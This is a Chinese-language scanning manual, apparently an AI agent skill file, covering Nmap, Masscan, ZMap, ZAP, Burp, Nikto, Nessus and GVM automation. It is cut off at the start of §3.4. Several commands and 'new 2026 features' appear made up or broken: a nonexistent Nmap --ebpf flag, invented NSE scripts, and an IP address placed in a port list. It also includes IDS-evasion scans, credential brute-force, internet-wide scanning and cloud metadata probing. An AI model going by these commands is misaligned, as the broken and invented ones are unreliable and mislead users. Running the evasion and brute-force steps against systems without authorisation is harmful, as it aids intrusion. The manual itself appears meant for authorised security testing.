---
name: "security-scanning"
description: "漏洞扫描与自动化安全测试全栈/Nmap/Nessus/OpenVAS/Nuclei/Acunetix/Burp Suite/2026最新扫描技术/AI驱动漏洞发现/持续安全扫描/DAST/SAST/IAST"
version: "3.0"
author: "Security Engineering Team"
date: "2026-07-25"
tags:
  - vulnerability-scanning
  - penetration-testing
  - devsecops
  - 2026-security
  - ai-security
  - cloud-security
  - container-security
  - sast
  - dast
  - iast
---

# 漏洞扫描与自动化安全测试 — 实战技能手册 v3.0

> **适用范围**: 企业安全团队 / 红蓝对抗 / DevSecOps 流水线 / 合规审计 / 云原生安全
> **最后更新**: 2026年7月
> **覆盖工具**: Nmap, Nessus, OpenVAS, Nuclei, Acunetix, Burp Suite Pro 2026, ZAP, Semgrep, CodeQL, SonarQube, Trivy, Prowler, ScoutSuite, Kube-Bench, Kube-Hunter, Masscan, ZMap

---

## 目录

1. [§1 网络扫描 (Network Scanning)](#1-网络扫描-network-scanning)
2. [§2 Web应用扫描 (Web Application Scanning)](#2-web应用扫描-web-application-scanning)
3. [§3 漏洞扫描 (Vulnerability Scanning)](#3-漏洞扫描-vulnerability-scanning)
4. [§4 模板驱动扫描 (Template-Based Scanning)](#4-模板驱动扫描-template-based-scanning)
5. [§5 静态应用安全测试 (SAST & Code Analysis)](#5-静态应用安全测试-sast--code-analysis)
6. [§6 动态与交互式扫描 (DAST & IAST)](#6-动态与交互式扫描-dast--iast)
7. [§7 容器与云安全扫描 (Container & Cloud Scanning)](#7-容器与云安全扫描-container--cloud-scanning)
8. [§8 AI驱动扫描 (AI-Driven Scanning)](#8-ai驱动扫描-ai-driven-scanning)
9. [§9 持续安全 (Continuous Security)](#9-持续安全-continuous-security)
10. [§10 扫描自动化与编排 (Scan Automation & Orchestration)](#10-扫描自动化与编排-scan-automation--orchestration)

---

## §1 网络扫描 (Network Scanning)

### 1.1 概述与核心原理

网络扫描是安全测试的基础环节，用于发现目标网络中的存活主机、开放端口、运行服务及其版本信息。2026年的网络扫描技术已从传统的IPv4 TCP/UDP扫描扩展到IPv6大规模扫描、云环境虚拟网络扫描、容器网络命名空间扫描以及服务网格（Service Mesh）层面的流量分析。核心技术栈包括：Nmap 7.95+、Masscan 1.3+、ZMap 4.0+、RustScan 2.3+ 以及云原生扫描工具（如 Azure Network Scanner、AWS VPC Reachability Analyzer）。

网络扫描的核心挑战在2026年有了新的维度：一是IPv6地址空间巨大（/64子网即有18,446,744,073,709,551,616个地址），传统全端口扫描不再可行，需要基于DNS反向区域、证书透明度日志（Certificate Transparency Logs）、BGP路由表等情报源进行目标缩减；二是云环境中的动态IP、弹性网卡、安全组、NACL等使得扫描面持续变化，需要结合云API进行资产发现后再扫描；三是容器网络中，Pod网络命名空间与主机网络命名空间隔离，需要特权容器或节点级扫描能力。

### 1.2 Nmap 核心扫描技术 (2026版)

Nmap 7.95 在2026年引入了多项新特性：支持HTTP/3服务发现、QUIC协议指纹识别、基于eBPF的内核级快速SYN扫描、以及改进的TLS 1.3指纹库。以下为实战命令集：

```bash
# 基础主机发现 — ICMP Echo + TCP SYN Ping + UDP Ping + ARP Ping
nmap -sn -PE -PS80,443,22,8080,8443 -PU161,53,123 -n 192.168.1.0/24

# 快速SYN扫描（使用eBPF加速，2026新特性）
nmap -sS -T4 --ebpf --min-rate 5000 --max-retries 1 -p- 10.0.0.0/8

# 完整TCP端口扫描 + 服务版本 + 操作系统检测 + NSE脚本
nmap -sS -sV -sC -O -p- --script-timeout 60s -oA full_scan 192.168.1.100

# UDP Top 1000端口扫描（UDP扫描慢，需限制端口范围）
nmap -sU -sV --top-ports 1000 --max-retries 2 -T4 -oA udp_scan 192.168.1.100

# IPv6网络扫描（使用-E选项指定源接口）
nmap -6 -sS -sV -sC -p 1-65535 --min-rate 3000 -oA ipv6_scan 2001:db8::/120

# 防火墙/IDS规避技术组合
nmap -sS -f --mtu 24 --data-length 128 --source-port 53 \
  -D RND:10 --randomize-hosts -T2 --max-retries 3 \
  -oA evasive_scan 192.168.1.100

# 云环境元数据端点探测（AWS/Azure/GCP/阿里云/腾讯云）
nmap --script http-meta-data-api \
  --script-args "aws,azure,gcp,alibaba,tencent" \
  -p 80,443,8080,8443,169.254.169.254 10.0.0.0/16
```

### 1.3 Nmap Scripting Engine (NSE) 实战

NSE是Nmap最强大的扩展能力，2026年NSE脚本库已超过600个脚本。以下为关键脚本分类与实战：

```bash
# 漏洞检测脚本组
nmap --script vuln -sV -p 1-10000 192.168.1.0/24

# 认证暴力破解检测
nmap --script auth --script-args "userdb=users.txt,passdb=passwords.txt" \
  -p 22,21,23,3389,5900 192.168.1.100

# SSL/TLS安全评估（2026年支持TLS 1.3和QUIC/HTTP3）
nmap --script ssl-enum-ciphers,ssl-cert,ssl-dh-params,ssl-heartbleed \
  --script-args "tls1.3,http3" -p 443,8443,465,993,995 192.168.1.100

# 数据库发现与信息收集
nmap --script "mysql-*,ms-sql-*,mongodb-*,redis-*,cassandra-*" \
  -p 3306,1433,27017,6379,9042 192.168.1.0/24

# HTTP服务深度探测（WAF检测、虚拟主机发现、目录枚举）
nmap --script "http-*" --script-args "http.useragent='Mozilla/5.0',\
  http-max-cache-size=1000000" \
  -p 80,443,8080,8443,3000,5000 192.168.1.0/24

# 2026年新增：容器运行时探测
nmap --script docker-version,containerd-info,k8s-apiserver-info \
  -p 2375,2376,6443,10250,10255 192.168.1.0/24

# 2026年新增：服务网格探测（Istio/Envoy/Linkerd）
nmap --script service-mesh-detect \
  --script-args "mesh.types=istio,linkerd,consul" \
  -p 15000-15021,4140,4190,8443 192.168.1.0/24
```

### 1.4 Masscan 大规模扫描

Masscan是世界上最快的端口扫描器，2026年v1.3版本支持每秒1000万发包速率，引入了IPv6支持改进和云环境元数据扫描模块。

```bash
# 全互联网端口扫描（需要授权！仅示例）
masscan 0.0.0.0/0 -p80,443,22,8080,8443,3389 --rate 1000000 \
  --output-format json -oJ masscan_output.json

# 内网大规模扫描配置
masscan 10.0.0.0/8 -p1-65535 --rate 50000 \
  --exclude 10.0.0.0/24 --randomize-hosts \
  --output-format grepable -oG masscan_internal.txt

# 与Nmap联动的扫描流水线
masscan 192.168.0.0/16 -p80,443,22,3389,8080 --rate 10000 \
  -oJ masscan.json && \
  cat masscan.json | jq -r '.[].ports[].port' | sort -u > open_ports.txt && \
  nmap -sV -sC -iL targets.txt -p $(tr '\n' ',' < open_ports.txt)

# 2026年新增：IPv6大规模扫描
masscan 2001:db8::/32 -p80,443 --rate 1000000 \
  --source-ip 2001:db8:1::1 \
  --output-format ndjson -oJ ipv6_scan.json
```

### 1.5 ZMap 互联网级扫描

ZMap 4.0在2026年支持了HTTP/3和QUIC扫描模块，以及基于eBPF的内核模式（kernel module bypass），可以实现接近线速的扫描性能。

```bash
# 互联网级443端口扫描（需root权限和有BGP宣告的IP段）
zmap -p 443 -o zmap_443.csv --output-fields="saddr,sport,daddr,dport,classification"

# HTTP/3 + QUIC 服务发现（2026新特性）
zmap -p 443 --probe-module=quic_initial \
  --output-module=csv -f "saddr,quic_version,tls_cipher,server_name" \
  -o quic_scan.csv

# 结合ZGrab2进行应用层指纹识别
zmap -p 443 --output-fields="saddr" | \
  zgrab2 tls --port 443 --certificates --heartbleed \
  --output-file=zgrab2_tls.json

# 模块化扫描：HTTP Banner抓取
zmap -p 80,443,8080,8443 -o http_targets.csv && \
  zgrab2 http --port 80 --port 443 --port 8080 --port 8443 \
  --max-redirects 3 --user-agent "SecurityScanner/2026" \
  --input-file=http_targets.csv -o http_banners.json
```

### 1.6 云环境网络扫描

云环境扫描需要特殊处理：安全组规则、NACL、VPC Peering、PrivateLink、以及云防火墙（如AWS WAF、Azure Firewall、阿里云云防火墙）的检测。

```bash
# AWS VPC 网络可达性分析（使用AWS CLI）
aws ec2 describe-network-interfaces --query \
  'NetworkInterfaces[].{PrivateIp:PrivateIpAddress,PublicIp:Association.PublicIp,SG:Groups[].GroupId}' \
  > aws_assets.json

# 结合AWS API进行资产发现后扫描
python3 << 'EOF'
import boto3, json, subprocess
ec2 = boto3.client('ec2')
instances = ec2.describe_instances(Filters=[{'Name':'instance-state-name','Values':['running']}])
ips = []
for r in instances['Reservations']:
    for i in r['Instances']:
        ips.append(i['PrivateIpAddress'])
with open('aws_targets.txt', 'w') as f:
    f.write('\n'.join(ips))
subprocess.run(['nmap', '-sV', '-sC', '-iL', 'aws_targets.txt', '-oA', 'aws_scan'])
EOF

# 阿里云ECS资产发现与扫描
aliyun ecs DescribeInstances --RegionId cn-hangzhou \
  --Status Running | jq -r '.Instances.Instance[].NetworkInterfaces.NetworkInterface[].PrimaryIpAddress' \
  > aliyun_targets.txt

# 容器网络命名空间扫描（需要节点级权限）
# 获取所有Pod IP并扫描
kubectl get pods -A -o json | jq -r \
  '.items[] | select(.status.podIP != null) | "\(.status.podIP) \(.metadata.namespace)/\(.metadata.name)"' \
  | while read ip name; do
    echo "Scanning $name ($ip)"
    nmap -sS -sV -p 1-10000 --host-timeout 30s $ip
  done
```

### 1.7 服务指纹识别与版本探测

精确的服务指纹识别是漏洞扫描的基础。2026年的指纹库需要覆盖：Web服务器（Nginx/Apache/IIS/Caddy/Traefik/Envoy）、数据库（MySQL 8.4/PostgreSQL 17/MongoDB 8.0）、消息队列（Kafka 4.0/RabbitMQ 4.1/Redis 8.0）、以及云原生组件（etcd 3.6/Consul 1.20/Nomad 2.0）。

```bash
# 激进版本探测：使用所有探测报文
nmap -sV --version-all --version-intensity 9 -p 1-10000 192.168.1.100

# 自定义服务指纹探测（Nmap Service Probes语法）
cat > /tmp/custom_probes.txt << 'PROBES'
Probe TCP CustomApp q|\x00\x01\x02APP_PROBE\x03\x04\x05|
rarity 9
ports 9999,19999,29999
match custom-app m|^CustomApp/([\d.]+)| p/CustomApp/ v/$1/
PROBES
nmap -sV --version-all --probes /tmp/custom_probes.txt -p 9999 192.168.1.100

# 基于响应的指纹数据库构建
# 使用httpx进行HTTP指纹收集
httpx -l targets.txt -tech-detect -status-code -title -websocket \
  -json -o http_fingerprints.json -threads 100

# 使用WhatWeb进行Web技术栈识别
whatweb --aggression 3 --no-errors -i targets.txt \
  --log-json=whatweb_results.json
```

### 1.8 2026年网络扫描新趋势

1. **eBPF加速扫描**: Linux内核6.12+支持eBPF XDP程序进行内核级SYN扫描，发包速率可达1000万pps，远超用户态扫描。
2. **QUIC/HTTP3扫描**: 随着HTTP/3普及，UDP 443端口扫描成为必需，Masscan和ZMap均已支持QUIC Initial Packet探测。
3. **服务网格扫描**: Istio/Envoy sidecar代理的15000-15021端口成为新的攻击面，需要专门的指纹识别。
4. **零信任网络扫描**: 在零信任架构中，扫描需要经过身份认证和授权，扫描工具需要支持mTLS认证。
5. **AI辅助目标发现**: 利用LLM分析组织架构、技术栈描述、招聘信息等OSINT数据，自动生成扫描目标列表。

---

## §2 Web应用扫描 (Web Application Scanning)

### 2.1 概述

Web应用扫描是安全测试中最复杂、最关键的环节。2026年的Web应用技术栈已高度多元化，包括：单页应用（SPA/React/Vue/Svelte）、微前端架构（Module Federation）、服务端渲染（Next.js 15/Nuxt 4）、API优先架构（GraphQL/OpenAPI 3.1/gRPC-Web）、WebAssembly前端、以及WebSocket/SSE/WebTransport等实时通信协议。扫描工具需要具备JavaScript渲染能力、API自动发现能力、以及WebSocket/GraphQL协议支持。

核心技术栈包括：Burp Suite Pro 2026、OWASP ZAP 2.16、Nikto 2.6、Wapiti 3.2、以及新兴的AI驱动扫描器（如Burp AI Assistant、ZAP AI Extension）。

### 2.2 Burp Suite Pro 2026 实战

Burp Suite Pro 2026引入了多项革命性功能：AI驱动的漏洞检测、GraphQL Introspection自动解析、基于Chromium 130+的内置浏览器引擎、以及OpenAPI 3.1规范的原生解析。

```bash
# Burp Suite REST API 自动化（2026新特性）
# 启动Burp Suite Professional (需要许可证)
# 使用REST API进行自动化扫描

# 导入OpenAPI规范并自动生成扫描配置
curl -X POST http://localhost:8090/api/v1/scan/import \
  -H "Content-Type: application/json" \
  -d '{"url":"https://api.example.com/openapi.json","type":"openapi"}'

# 创建认证扫描任务（支持JWT/OAuth2/API Key/Cookie）
curl -X POST http://localhost:8090/api/v1/scan/create \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Production API Scan",
    "scope": {"include": ["https://api.example.com"], "exclude": ["/health"]},
    "authentication": {
      "type": "jwt",
      "config": {
        "login_url": "https://api.example.com/auth/login",
        "credentials": {"username": "{{USER}}", "password": "{{PASS}}"},
        "token_extraction": {"location": "body", "json_path": "$.access_token"}
      }
    },
    "scan_configuration": {
      "audit_checks": ["all"],
      "detection_scope": ["reflected_xss","sqli","ssrf","idor","auth_bypass"],
      "max_scan_time_minutes": 120
    }
  }'

# 获取扫描结果（JSON格式）
curl http://localhost:8090/api/v1/scan/findings \
  -H "Accept: application/json" | jq '.findings[] | select(.severity=="high")'
```

**Burp Suite 高级配置 (project_options.json)**:

```json
{
  "scanning": {
    "active_scanning": {
      "max_concurrent_requests": 10,
      "max_retries": 3,
      "timeout_ms": 30000,
      "javascript_analysis": {
        "enabled": true,
        "max_depth": 10,
        "analyze_minified": true,
        "detect_client_side_vulns": true
      },
      "graphql": {
        "enabled": true,
        "auto_introspection": true,
        "max_depth": 5,
        "detect_batching_attacks": true
      },
      "websocket": {
        "enabled": true,
        "max_frame_size": 65536,
        "detect_csrf_websocket": true
      }
    },
    "passive_scanning": {
      "analyze_javascript": true,
      "detect_info_disclosure": true,
      "detect_technology_stack": true,
      "ai_assistant": {
        "enabled": true,
        "confidence_threshold": 0.85,
        "analyze_response_patterns": true
      }
    }
  }
}
```

### 2.3 OWASP ZAP 2.16 自动化扫描

OWASP ZAP在2026年发布了2.16版本，引入了AI驱动的被动扫描、GraphQL自动化测试、以及Kubernetes原生部署支持。

```bash
# ZAP Docker模式启动（Headless自动扫描）
docker run -d --name zap-scanner \
  -v $(pwd)/zap_work:/zap/wrk \
  -p 8090:8090 \
  ghcr.io/zaproxy/zaproxy:stable \
  zap.sh -daemon -host 0.0.0.0 -port 8090 \
  -config api.addrs.addr.name=.* \
  -config api.addrs.addr.regex=true \
  -config api.key=zap2026securekey

# 自动化主动扫描（ZAP API）
# Step 1: 启动Spider爬虫
curl "http://localhost:8090/JSON/spider/action/scan/?\
  apikey=zap2026securekey&\
  url=https://example.com&\
  maxChildren=10&\
  recurse=true&\
  subtreeOnly=false&\
  contextName=Default"

# Step 2: 等待爬虫完成
while [ "$(curl -s "http://localhost:8090/JSON/spider/view/status/?apikey=zap2026securekey" \
  | jq -r '.status')" != "100" ]; do sleep 5; done

# Step 3: AJAX Spider（JavaScript渲染页面）
curl "http://localhost:8090/JSON/ajaxSpider/action/scan/?\
  apikey=zap2026securekey&\
  url=https://example.com&\
  inScope=true&\
  contextName=Default"

# Step 4: 主动扫描
curl "http://localhost:8090/JSON/ascan/action/scan/?\
  apikey=zap2026securekey&\
  url=https://example.com&\
  recurse=true&\
  inScopeOnly=true&\
  scanPolicyName=Default Policy&\
  method=GET"

# Step 5: 导出报告
curl "http://localhost:8090/OTHER/core/other/htmlreport/?\
  apikey=zap2026securekey" > zap_report.html

# Step 6: 导出JSON格式结果（用于CI/CD集成）
curl "http://localhost:8090/JSON/core/view/alerts/?\
  apikey=zap2026securekey&\
  baseurl=https://example.com&\
  start=0&\
  count=9999" | jq '.' > zap_alerts.json
```

**ZAP自动化扫描Python脚本**:

```python
#!/usr/bin/env python3
"""ZAP 自动化扫描脚本 — 适用于CI/CD流水线"""
import time, json, requests, sys

ZAP_URL = "http://localhost:8090"
API_KEY = "zap2026securekey"
TARGET = "https://example.com"

def zap_request(endpoint, params=None):
    if params is None:
        params = {}
    params['apikey'] = API_KEY
    return requests.get(f"{ZAP_URL}{endpoint}", params=params).json()

# 1. 访问目标URL以建立上下文
zap_request("/JSON/core/action/accessUrl/", {"url": TARGET})

# 2. 传统爬虫
scan_id = zap_request("/JSON/spider/action/scan/", {
    "url": TARGET, "maxChildren": 10, "recurse": "true"
})['scan']

while int(zap_request("/JSON/spider/view/status/")['status']) < 100:
    print(f"Spider progress: {zap_request('/JSON/spider/view/status/')['status']}%")
    time.sleep(5)

# 3. AJAX爬虫（处理SPA）
zap_request("/JSON/ajaxSpider/action/scan/", {
    "url": TARGET, "inScope": "true"
})

# 4. GraphQL端点探测（2026新特性）
zap_request("/JSON/graphql/action/importUrl/", {
    "url": f"{TARGET}/graphql", "endurl": TARGET
})

# 5. OpenAPI导入（2026新特性）
zap_request("/JSON/openapi/action/importUrl/", {
    "url": f"{TARGET}/api-docs", "hostOverride": TARGET
})

# 6. 主动扫描
ascan_id = zap_request("/JSON/ascan/action/scan/", {
    "url": TARGET, "recurse": "true", "inScopeOnly": "true"
})['scan']

while int(zap_request("/JSON/ascan/view/status/")['status']) < 100:
    print(f"Active scan: {zap_request('/JSON/ascan/view/status/')['status']}%")
    time.sleep(10)

# 7. 获取告警
alerts = zap_request("/JSON/core/view/alerts/", {"baseurl": TARGET})
with open("zap_results.json", "w") as f:
    json.dump(alerts, f, indent=2)

# 8. 按严重性统计
severity_counts = {"High": 0, "Medium": 0, "Low": 0, "Informational": 0}
for alert in alerts.get('alerts', []):
    sev = alert.get('risk', 'Informational')
    if sev in severity_counts:
        severity_counts[sev] += 1

print(f"Scan Results: {severity_counts}")

# 9. CI/CD门禁：High级别告警超过0则失败
if severity_counts['High'] > 0:
    print(f"FAIL: {severity_counts['High']} High severity issues found!")
    sys.exit(1)
else:
    print("PASS: No high severity issues.")
```

### 2.4 Nikto Web服务器扫描

Nikto 2.6在2026年更新了数据库，包含超过7000个测试用例，涵盖新增的CVE-2025和CVE-2026漏洞。

```bash
# 基础扫描
nikto -h https://example.com -o nikto_report.html -Format htm

# 使用认证扫描
nikto -h https://example.com -id "admin:password" \
  -o nikto_auth.txt -Format txt

# 使用代理（配合Burp Suite）
nikto -h https://example.com -useproxy http://127.0.0.1:8080

# 使用自定义User-Agent和Cookie
nikto -h https://example.com \
  -useragent "Mozilla/5.0 (Security Scanner)" \
  -C "session=abc123; token=xyz789"

# 调优扫描：仅测试特定类型（减少误报）
nikto -h https://example.com -Tuning 123456789 \
  -o nikto_tuned.txt
# Tuning options:
# 1=Interesting File, 2=Misconfiguration, 3=Info Disclosure
# 4=Injection, 5=Remote File Retrieval, 6=Denial of Service
# 7=Remote File Retrieval (WebDAV), 8=Command Execution
# 9=SQL Injection

# 批量扫描
while read url; do
  nikto -h "$url" -o "nikto_$(echo $url | sed 's/[^a-zA-Z0-9]/_/g').txt"
done < targets.txt
```

### 2.5 API扫描（GraphQL / OpenAPI / gRPC）

2026年API安全扫描已成为独立的安全测试领域，以下为专用工具和工作流：

```bash
# GraphQL端点发现与扫描
# 使用graphql-scanner（2026年新工具）
graphql-scanner scan \
  --url https://api.example.com/graphql \
  --introspection \
  --depth 7 \
  --detect-batching \
  --detect-subscription-abuse \
  --output graphql_report.json

# OpenAPI/Swagger 端点发现与安全测试
# 使用openapi-scanner
openapi-scanner scan \
  --spec https://api.example.com/openapi.json \
  --auth-header "Authorization: Bearer $TOKEN" \
  --fuzz-parameters \
  --detect-mass-assignment \
  --detect-bola \
  --output openapi_report.json

# 使用Arjun进行API参数发现
arjun -u https://api.example.com/v1/users \
  -c 200 \
  -m GET,POST,PUT,PATCH \
  -o arjun_params.json

# gRPC服务扫描（使用grpcurl）
grpcurl -plaintext 10.0.0.100:50051 list
grpcurl -plaintext 10.0.0.100:50051 describe .ServiceName

# 使用Burp Suite gRPC扩展
# 将gRPC调用转换为HTTP/2请求进行扫描
```

### 2.6 SPA与JavaScript密集应用扫描

单页应用（SPA）和JavaScript密集应用需要特殊的扫描策略，因为它们的内容是通过客户端JavaScript动态渲染的。

```bash
# 使用Puppeteer/Playwright进行页面渲染后抓取
# 创建渲染代理，将SPA转换为静态HTML供扫描器分析
cat > spa_renderer.js << 'EOF'
const puppeteer = require('puppeteer');
const express = require('express');
const app = express();

app.get('/render', async (req, res) => {
  const url = req.query.url;
  const browser = await puppeteer.launch({headless: 'new'});
  const page = await browser.newPage();
  await page.goto(url, {waitUntil: 'networkidle2', timeout: 30000});
  const html = await page.content();
  // 收集所有API调用
  const apiCalls = await page.evaluate(() => {
    return window.__API_CALLS__ || [];
  });
  await browser.close();
  res.json({html, apiCalls});
});

app.listen(3000);
EOF

# 启动渲染代理
node spa_renderer.js &

# ZAP通过渲染代理扫描SPA
curl "http://localhost:8090/JSON/spider/action/scan/?\
  apikey=zap2026securekey&\
  url=http://localhost:3000/render?url=https://spa.example.com"

# 使用Playwright进行登录态保持和自动化遍历
cat > spa_crawler.py << 'PYEOF'
from playwright.sync_api import sync_playwright
import json

def crawl_spa(base_url, login_url, credentials):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        
        # 登录
        page.goto(login_url)
        page.fill('input[name="username"]', credentials['username'])
        page.fill('input[name="password"]', credentials['password'])
        page.click('button[type="submit"]')
        page.wait_for_load_state('networkidle')
        
        # 收集所有可点击元素
        routes = set()
        links = page.locator('a[href]').all()
        buttons = page.locator('button').all()
        
        for link in links + buttons:
            href = link.get_attribute('href') or link.get_attribute('data-route')
            if href:
                routes.add(href)
        
        # 遍历所有路由
        visited = set()
        for route in list(routes)[:100]:
            if route in visited:
                continue
            visited.add(route)
            page.goto(f"{base_url}{route}", wait_until='networkidle')
            # 记录API调用
            api_calls = page.evaluate('''() => {
                return performance.getEntriesByType('resource')
                    .filter(r => r.name.includes('/api/'))
                    .map(r => ({url: r.name, type: r.initiatorType}));
            }''')
            print(f"Route: {route}, API Calls: {len(api_calls)}")
        
        browser.close()
        return list(visited)

routes = crawl_spa('https://spa.example.com', 
                    'https://spa.example.com/login',
                    {'username': 'admin', 'password': 'test123'})
with open('spa_routes.json', 'w') as f:
    json.dump(routes, f)
PYEOF
```

### 2.7 Web应用扫描最佳实践

1. **认证扫描**: 始终使用认证扫描，因为大多数漏洞存在于认证后的功能中。配置Session Handling规则，自动处理Token过期和重登录。
2. **API优先扫描**: 先扫描API端点（OpenAPI/GraphQL），再扫描前端页面，因为现代应用的逻辑集中在API层。
3. **速率限制**: 配置请求速率限制，避免触发WAF/IDS封禁，同时避免对生产环境造成性能影响。
4. **扫描窗口**: 在业务低峰期进行扫描，配置最大扫描时间，避免长时间占用资源。
5. **增量扫描**: 对持续更新的应用，使用增量扫描模式，仅扫描变更的端点和参数。
6. **结果验证**: 对所有High/Critical级别漏洞进行人工验证，避免误报影响业务决策。

---

## §3 漏洞扫描 (Vulnerability Scanning)

### 3.1 概述

漏洞扫描是安全测试的核心环节，用于系统性地识别目标系统中的已知漏洞（CVE）和配置弱点。2026年的漏洞扫描技术已从传统的基于签名的扫描发展到融合AI的智能漏洞发现。CVE数量在2025年突破30,000个，2026年预计超过35,000个，手工跟踪已不可能，必须依赖自动化工具和AI辅助的漏洞优先级排序（Vulnerability Prioritization）。

核心技术栈：Nessus Professional 10.8+、OpenVAS/GVM 23+、Qualys Cloud Platform 2026、以及新兴的AI驱动漏洞扫描器（如CrowdStrike Falcon Exposure Management、Wiz、Orca Security）。

### 3.2 Nessus Professional 10.8 实战

Nessus在2026年保持了企业级漏洞扫描的领先地位，10.8版本引入了AI辅助的漏洞优先级评分（AI-VPR）、容器镜像扫描、以及云端资产管理。

```bash
# Nessus CLI 自动化（使用nessuscli）
# 列出所有扫描策略
/opt/nessus/sbin/nessuscli policy list

# 创建自定义扫描策略
/opt/nessus/sbin/nessuscli policy create \
  --name "PCI-DSS Compliance Scan" \
  --template "pci_dss" \
  --output pci_policy.json

# 启动扫描（通过REST API）
curl -X POST https://nessus.example.com:8834/scans \
  -H "X-ApiKeys: accessKey=xxx; secretKey=yyy" \
  -H "Content-Type: application/json" \
  -d '{
    "uuid": "template-uuid-for-advanced-scan",
    "settings": {
      "name": "Production Network Scan 2026-07",
      "text_targets": "10.0.0.0/8, 192.168.0.0/16",
      "enabled": true,
      "launch": "ON_DEMAND",
      "scanner_id": 1,
      "policy_id": 12345
    }
  }'

# 监控扫描状态
SCAN_ID=123
while true; do
  STATUS=$(curl -s "https://nessus.example.com:8834/scans/$SCAN_ID" \
    -H "X-ApiKeys: accessKey=xxx; secretKey=yyy" \
    | jq -r '.info.status')
  echo "Scan Status: $STATUS"
  if [ "$STATUS" = "completed" ]; then break; fi
  sleep 60
done

# 导出扫描结果（Nessus格式）
curl -X POST "https://nessus.example.com:8834/scans/$SCAN_ID/export" \
  -H "X-ApiKeys: accessKey=xxx; secretKey=yyy" \
  -H "Content-Type: application/json" \
  -d '{"format": "nessus"}' > export_info.json

# 下载报告
FILE_ID=$(cat export_info.json | jq -r '.file')
curl "https://nessus.example.com:8834/scans/$SCAN_ID/export/$FILE_ID/download" \
  -H "X-ApiKeys: accessKey=xxx; secretKey=yyy" \
  -o scan_results.nessus

# 使用Python解析Nessus结果
python3 << 'PYEOF'
import xml.etree.ElementTree as ET
import json

tree = ET.parse('scan_results.nessus')
root = tree.getroot()

vulnerabilities = []
for report in root.findall('.//Report'):
    for host in report.findall('ReportHost'):
        ip = host.get('name')
        for item in host.findall('ReportItem'):
            if item.get('severity') and int(item.get('severity')) >= 2:
                vuln = {
                    'host': ip,
                    'port': item.get('port'),
                    'service': item.get('svc_name'),
                    'plugin': item.get('pluginName'),
                    'severity': item.get('severity'),
                    'cve': item.findtext('cve'),
                    'cvss': item.findtext('cvss_base_score'),
                    'cvss3': item.findtext('cvss3_base_score'),
                    'description': item.findtext('description'),
                    'solution': item.findtext('solution'),
                    'risk_factor': item.findtext('risk_factor'),
                    'exploit_available': item.findtext('exploit_available')
                }
                vulnerabilities.append(vuln)

# 按CVSS 3.0排序
vulnerabilities.sort(key=lambda x: float(x['cvss3'] or 0), reverse=True)

with open('nessus_parsed.json', 'w') as f:
    json.dump(vulnerabilities[:100], f, indent=2)

print(f"Total vulnerabilities: {len(vulnerabilities)}")
print(f"Critical (CVSS 9.0+): {len([v for v in vulnerabilities if float(v['cvss3'] or 0) >= 9.0])}")
print(f"High (CVSS 7.0-8.9): {len([v for v in vulnerabilities if 7.0 <= float(v['cvss3'] or 0) < 9.0])}")
PYEOF
```

### 3.3 OpenVAS / Greenbone Vulnerability Manager (GVM)

OpenVAS是开源漏洞扫描器的标杆，GVM 23+在2026年提供了Enterprise级别的功能，包括分布式扫描、SCAP/OVAL支持、以及CVE自动更新。

```bash
# 使用Docker Compose部署GVM完整环境
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  gvm:
    image: greenbone/gvm:latest
    ports:
      - "9392:9392"   # GSA Web界面
      - "9390:9390"   # GVM Manager
    volumes:
      - gvm-data:/var/lib/gvm
      - gvm-socket:/var/run/gvm
    environment:
      - GVM_USERNAME=admin
      - GVM_PASSWORD=ChangeMe2026!
      - GVM_UPDATE_FEEDS=true
    restart: unless-stopped

  gvm-scanner:
    image: greenbone/gvm:latest
    volumes:
      - gvm-socket:/var/run/gvm
    command: gvmd --listen=0.0.0.0 --port=9390
    restart: unless-stopped

volumes:
  gvm-data:
  gvm-socket:
EOF

docker-compose up -d

# 等待GVM初始化完成（CVE/NVT feeds更新）
echo "等待GVM初始化（约15-30分钟）..."
while ! curl -s http://localhost:9392 > /dev/null; do
  sleep 30
  echo "等待GVM就绪..."
done

# GVM命令行自动化（使用gvm-cli）
# 安装gvm-tools
pip install gvm-tools

# 创建扫描任务
gvm-cli socket --socketpath /var/run/gvm/gvmd.sock \
  --xml "<create_task>\
    <name>Internal Network Scan</name>\
    <comment>Automated weekly scan</comment>\
    <config id='daba56c8-73ec-11df-a475-002264764cea'/>\
    <target id='target-uuid'/>\
    <scanner id='08b69003-5fc2-4037-a479-93b440211c73'/>\
  </create_task>"

# Python自动化脚本
python3 << 'PYEOF'
from gvm.connections import UnixSocketConnection
from gvm.protocols.gmp import Gmp
from gvm.transforms import EtreeTransform
import time

connection = UnixSocketConnection(path='/var/run/gvm/gvmd.sock')
transform = EtreeTransform()

with Gmp(connection, transform=transform) as gmp:
    gmp.authenticate('admin', 'ChangeMe2026!')
    
    # 创建目标
    target = gmp.create_target(
        name='Internal Network',
        hosts=['10.0.0.0/24', '192.168.1.0/24'],
        port_range='T:1-10000,U:1-1000'
    )
    target_id = target.get('id')
    
    # 获取扫描配置
    configs = gmp.get_scan_configs()
    config_id = None
    for config in configs.xpath('//config'):
        if 'Full and fast' in config.findtext('name'):
            config_id = config.get('id')
            break
    
    # 创建任务
    task = gmp.create_task(
        name='Automated Internal Scan',
        config_id=config_id,
        target_id=target_id,
        scanner_id='08b69003-5fc2-4037-a479-93b440211c73'
    )
    task_id = task.get('id')
    
    # 启动扫描
    gmp.start_task(task_id)
    print(f"Task {task_id} started")
    
    # 等待完成
    while True:
        task_status = gmp.get_task(task_id)
        status = task_status.xpath('//task/status/text()')[0]
        print(f"Status: {status}")
        if status == 'Done':
            break
        time.sleep(60)
    
    # 获取结果
    report = gmp.get_task(task_id)
    report_id = report.xpath('//task/last_report/report/@id')[0]
    
    # 获取漏洞
    results = gmp.get_results(filter=f'report_id={report_id} severity>5.0')
    for result in results.xpath('//result'):
        name = result.findtext('name')
        severity = result.findtext('severity')
        host = result.findtext('host')
        print(f"[{severity}] {host}: {name}")
PYEOF
```

### 3.4 CVE自动匹配与漏洞优先级评分 (VPR)

2026年，漏洞优先级评分（Vulnerability Priority Rating, VPR）已成为漏洞管理的核心概念。传统CVSS评分仅反映漏洞的技术严重性，而VPR结合了：漏洞利用成熟度（Exploit Maturity）、威胁情报（Threat Intelligence）、资产重要性（Asset Criticality）、以及补偿控制（Compensating Controls）。

```python
#!/usr/bin/env python3
"""CVE自动匹配与漏洞优先级评分引擎"""

import json, requests, hashlib, time
from datetime import datetime, timedelta
from dataclasses import dataclass
